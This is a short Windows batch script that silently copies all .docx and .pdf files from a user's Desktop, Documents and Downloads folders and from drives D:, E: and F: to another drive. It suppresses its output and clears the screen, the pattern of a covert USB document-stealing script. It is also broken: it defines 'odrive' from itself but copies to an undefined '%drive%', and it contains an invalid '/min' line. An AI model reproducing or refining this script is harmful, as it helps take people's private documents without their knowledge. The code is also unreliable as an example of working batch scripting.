@echo off
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
%backupcmd% "%USERPROFILE%\Desktop\*.docx" "%drive%\all\Desktop"
%backupcmd% "%USERPROFILE%\Documents\*.docx" "%drive%\all\Documents"
%backupcmd% "%USERPROFILE%\Downloads\*.docx" "%drive%\all\download"
%backupcmd% "D:\*.docx" "%drive%\D"
%backupcmd% "E:\*.docx" "%drive%\E"
%backupcmd% "F:\*.docx" "%drive%\F"
%backupcmd% "%USERPROFILE%\Desktop\*.pdf" "%drive%\all\Desktop"
%backupcmd% "%USERPROFILE%\Documents\*.pdf" "%drive%\all\Documents"
%backupcmd% "%USERPROFILE%\Downloads\*.pdf" "%drive%\all\download"
%backupcmd% "D:\*.pdf" "%drive%\D"
%backupcmd% "E:\*.pdf" "%drive%\E"
%backupcmd% "F:\*.pdf" "%drive%\F"
@echo off
cls